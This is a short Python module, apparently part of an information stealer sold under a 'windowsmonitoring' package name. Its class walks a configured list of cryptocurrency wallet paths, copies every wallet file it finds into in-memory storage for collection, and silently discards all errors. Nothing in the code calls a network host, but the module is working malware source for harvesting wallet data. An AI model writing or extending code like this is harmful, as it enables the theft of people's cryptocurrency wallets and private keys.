from os import path

from systoring.windowsmonitoring.helpers import MemoryStorage
from systoring.windowsmonitoring.helpers.config import WSConfig
from systoring.windowsmonitoring.helpers.dataclasses import Data


class WS:
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = WSConfig()
        self.__storage = MemoryStorage()

    def __get_WS_files(self) -> None:
        """
        Collects configs from the crypto WS.

        Parameters:
        - None.

        Returns:
        - None.
        """
        WS = self.__config.WalletPaths

        for wallet in WS:

            if not path.exists(wallet["path"]):
                continue

            self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
            self.__storage.add_data("Wallet", wallet["name"])

    def run(self) -> Data:
        """
        Launches the crypto WS collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_WS_files()

            return self.__storage.get_data()

        except Exception as e:
            pass
